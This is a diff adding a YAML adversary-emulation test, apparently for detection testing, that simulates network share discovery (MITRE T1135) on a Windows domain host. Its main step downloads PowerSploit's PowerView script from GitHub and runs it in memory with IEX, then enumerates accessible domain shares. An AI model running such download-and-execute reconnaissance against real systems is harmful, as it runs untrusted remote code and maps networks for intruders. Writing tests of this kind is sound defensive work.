@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Share Discovery with PowerView
+description: |
+    Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.
+uuid: b1636f0a-ba82-435c-b699-0d78794d8bfd
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1135: Network Share Discovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Endpoint must be joined to domain
+      inline: |
+        if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {{"Join system to domain"
+        }}
+      executor: powershell
+    - name: share-discovery-with-powerview
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
